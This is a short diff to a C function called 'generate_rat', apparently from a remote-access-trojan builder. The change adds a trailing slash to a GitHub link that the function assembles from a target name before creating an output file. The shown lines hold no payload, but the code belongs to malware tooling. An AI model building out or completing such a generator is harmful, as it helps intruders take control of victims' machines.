@@ -12,6 +12,7 @@ void generate_rat(char Target[] , char file_name[]) {
 	strcpy(target_dir, Target);
 	strcat(github_link, github_repo);
 	strcat(github_link, Target);
+	strcat(github_link, "/");
 	printf("Target = %s", Target);
 	printf("\nCreating File: %s", file_name);
 	char c[100];
